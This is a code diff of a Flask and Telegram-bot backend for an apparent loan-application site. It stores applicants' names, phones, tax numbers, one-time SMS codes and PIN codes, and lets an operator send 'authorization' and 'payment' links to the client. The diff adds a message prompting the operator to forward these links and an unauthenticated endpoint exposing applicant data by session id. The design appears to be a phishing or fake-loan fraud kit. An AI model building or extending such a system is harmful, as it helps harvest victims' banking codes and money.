@@ -7,7 +7,7 @@ from flask import Flask, request, jsonify
 from flask_cors import CORS
 
 app = Flask(__name__)
-CORS(app)  # ← важно!
+CORS(app)
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
@@ -18,11 +18,14 @@ def init_db():
     conn = sqlite3.connect('applications.db')
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS applications
-                 (id INTEGER PRIMARY KEY, fullname TEXT, phone TEXT, inn TEXT,
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  fullname TEXT, phone TEXT, inn TEXT,
                   income REAL, term INTEGER, amount REAL, payment REAL,
-                  session_id TEXT, status TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
+                  session_id TEXT, status TEXT,
+                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
     c.execute('''CREATE TABLE IF NOT EXISTS auth_sessions
-                 (session_id TEXT PRIMARY KEY, phone TEXT, sms_code TEXT, pin_code TEXT)''')
+                 (session_id TEXT PRIMARY KEY,
+                  phone TEXT, sms_code TEXT, pin_code TEXT)''')
     conn.commit()
     conn.close()
 
@@ -71,13 +74,13 @@ def webhook():
             session_id = callback_data.split(':')[1]
             link = f"{SITE_URL}/page_82554/?session={session_id}"
             send_callback_answer(callback_id, "✅ Ссылка на авторизацию")
-            edit_message_text(chat_id, message_id, f"🔐 <b>Ссылка на авторизацию</b>\n\n{link}", None)
+            edit_message_text(chat_id, message_id, f"🔐 <b>Ссылка на авторизацию</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
             
         elif callback_data.startswith('payment:'):
             session_id = callback_data.split(':')[1]
             link = f"{SITE_URL}/page_63860/?session={session_id}"
             send_callback_answer(callback_id, "✅ Ссылка на оплату")
-            edit_message_text(chat_id, message_id, f"💳 <b>Ссылка на оплату</b>\n\n{link}", None)
+            edit_message_text(chat_id, message_id, f"💳 <b>Ссылка на оплату</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
             
         elif callback_data.startswith('reject:'):
             session_id = callback_data.split(':')[1]
@@ -120,6 +123,17 @@ def submit_application():
     
     send_to_admin(msg, get_keyboard(session_id))
     return jsonify({"status": "ok", "session_id": session_id})
+
+@app.route('/get_application/<session_id>', methods=['GET'])
+def get_application(session_id):
+    conn = sqlite3.connect('applications.db')
+    c = conn.cursor()
+    c.execute('SELECT fullname, phone, amount, term FROM applications WHERE session_id = ?', (session_id,))
+    row = c.fetchone()
+    conn.close()
+    if row:
+        return jsonify({"fullname": row[0], "phone": row[1], "amount": row[2], "term": row[3]})
+    return jsonify({"error": "not found"}), 404
 
 @app.route('/submit_phone', methods=['POST'])
 def submit_phone():
